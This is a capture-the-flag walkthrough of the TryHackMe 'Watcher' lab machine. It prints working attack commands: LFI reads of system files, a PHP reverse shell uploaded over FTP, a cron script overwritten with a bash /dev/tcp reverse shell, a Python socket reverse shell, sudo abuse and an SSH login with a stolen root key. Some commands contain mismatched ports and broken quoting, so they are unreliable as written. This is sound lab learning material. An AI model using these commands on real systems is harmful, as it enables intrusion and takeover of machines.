# Try Hack Me - Watcher
# Author: Atharva Bordavekar
# Diffculty: Medium
# Points:
# Vulnerabilities:
# Phase 1 - Reconnaissance:

nmap scan:

PORT   STATE SERVICE

21/tcp open  ftp

22/tcp open  ssh

80/tcp open  http

let's enumerate the webpage at port 80 first. on visiting it, we did not find any thing interesting inside the soure code. so we will simply run a gobuster scan on the directories of the website.

```bash
gobuster dir -u http://<target_ip> -w /usr/share/wordlists/medium.txt

#NOTE: i changed the file name from directory-list-lowercase-2.3-medium.txt to medium.txt
```
on fuzzing the directories, i found some intesting pages:

/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/css                  (Status: 301) [Size: 312] [--> http://10.81.173.230/css/]                                                               
/images               (Status: 301) [Size: 315] [--> http://10.81.173.230/images/]                                                            
/index.php            (Status: 200) [Size: 4826]
/robots.txt           (Status: 200) [Size: 69]
/server-status        (Status: 403) [Size: 278]

on accessing the /robots.txt directory, we find two hidden directories. the first directory leads us to the flag1. the second directory is a hint for finding the rest of the flags.

on reading the hint for the flag2 i thought that the LFI would be present at the /index.php page. but i was wrong. after some minutes of fuzzing parameters for LFI on the /index.php page, i finally gave up and started interacting with the main page until i found the actual vulnerability at the url

```bash
http://10.81.173.230/post.php?post=../../../../etc/passwd
```
here we can clearly see an LFI vulnerability. using this we will first try to get an intial foothold on the system by carrying out RCE. lets see if we can view the logs or not. if possible we will go with log poisoning. but before injecting the logs, lets find out the flag2. we already know that there was a /secret_file_do_not_read.txt. the path should be at /var/www/html/secret_file_do_not_read.txt since it is uploaded to the webserver. lets use LFI to access it

```bash
http://<target_ip>/post.php?post=../../../../var/www/html/secret_file_do_not_read.txt 
```

we find the ftp credentials. using this we can access the ftp server at the port 21. 

```bash
ftp <target_ip>
# enter the username and password manually!
```
we find the flag2. lets download it using the get command
```bash
get flag_2.txt
```
now lets try to exploit RCE via LFI. after accessing the /var/www/html/apache2/access.log i came to understand that log poisoning was not possible. lets find some other way around. so i spent nearly 2 hours on trying to get an initial foothold by trying the /proc poisoning using burpsuite but we were not sucessful doing that. then i remembered that there exists a /files directory on the ftp server. i quickly login into ftp again and navigate to the /files directory. now what we will do is try to upload a reverseshell on the system in order to get shell as www-data

```bash
cat /usr/share/webshells/php/reverseshell/shell.php
# now copy this and edit your ip and port respectively
```
now save this reverse shell in a file named revshell.php. after savif it give it the appropriate permissions and send it over to the ftp server.
```bash
#on the ftp server at /files directory
put revshell.php
```
now we will access this file through the LFI vulnerability.

```bash
#first setup a netcat listner:
nc -lnvp 4444
```
now simply paste this in your browser

```bash
#in your browser:
http://<target_ip>/post.php?post=/home/ftpuser/ftp/files/revshell.php 
```
and just like that we have a shell as www-data. since www-data doesn't have a home directory, we will use the find command to locate the flag_3.txt. as the format of the file names in which the flags are stored is predictable, we can easily use the command:

```bash
find / -name "flag_3.txt" 2>/dev/null
```
the path of the flag_3.txt is at the location /var/www/html/more_secrets_a9f10a/flag_3.txt. we simply read the flag_3.txt flag and submit it.

now lets gain access as the next user with higher privileges. we will have to get a shell as toby. lets check what privileges the user www-data has using the command sudo -l

```bash
sudo -l
```
we find out that the user www-data can run:

`User www-data may run the following commands on ip-10-81-173-230:
    (toby) NOPASSWD: ALL` 

this is the easiest way to get a shell as toby. 

```bash
sudo -u toby /bin/bash
```

now we have a shell as toby. lets navigate to the /home/toby directory and read the flag_4.txt flag and submit it. in the same directory we find a note.txt.

`Hi Toby,

I've got the cron jobs set up now so don't worry about getting that done.

Mat
`

this is a hint at a cronjob which runs as user mat. lets check out the script which is run via cron jobs

```bash
cat /etc/crontab
```
`*/1 * * * * mat /home/toby/jobs/cow.sh` this is the cronjob that we need to abuse in order to get a shell as mat. after viewing the contents of the cow.sh i find out that it basically carries out this command every minute `cp /home/mat/cow.jpg /tmp/cow.jpg` now we will inject our own reverseshell which will get us a shell as mat within a minute.

```bash
cat > /home/toby/jobs/cow.sh << 'EOF'
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/<target_ip>/5555 0>&1'
EOF
```
now we will setup a listner at the port 5555

```bash
nc -lnvp 5555
```
after some time we will get a shell as user mat! lets quickly navigate to the /home/mat directory. we read and submit the flag_5.txt. now there is another note.txt which will be hint for the privilege escalation from user mat to user will. lets read the contents of it.

`Hi Mat,

I've set up your sudo rights to use the python script as my user. You can only run the script with sudo so it should be safe.

Will
` 

now we will navigate to the /home/mat/scripts directory and find two python scripts. the first script is cmd.py which can be edited by us while the second script is will_script.py which cannot be edited by us but we have some privileges accoriding to the note above. 

```bash
sudo -l
```

`User mat may run the following commands on ip-10-81-173-230:
    (will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py `

turns out that we can execute the will_script.py as sudo. since the will_script.py will execute the cmd.py when run, if we inject a python reverse shell into cmd.py we might be able to get a shell as will. i tried mutliple bash reverse shells in the return argument but all of them failed, hence i will be using a python reverse shell since is is the most logical thing to do.

```bash 
echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.132.190",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])" > cmd.py
```
now we will setup a netcat listner at port 6666 and then trigger the reverse shell

```bash
nc -lnvp 6666
```
use sudo as user will trigger the reverse shell

```bash
#don't forget to provide an argument
sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 1
```
we have a shell as will! lets run linpeas on the system and find the way to get a root shell. after running and analysing the linpeas output, we found out an interesting file at /opt/backups. 

```bash
cat /opt/backups/key.b64
```
now we get a long base64 string which we will decode using cyber chef. 

after decoding the base64 encoded string, the output is that of the private keys of some user. since there is no other user higher than will, it must belong to the user root! we will save the contents of the base64 decoded string to a file named root_id_rsa

```bash
# don't forget to give the root_id_rsa the appropriate permissions:
chmod 600 root_id_rsa
```
now for the final nail in the coffin, we will access the ssh shell of the root user using the -i flag.

```bash
ssh -i root_id_rsa root@<target_ip>
```
and just like that we have found the final flag_7.txt. we submit the flag and complete this CTF.
                          
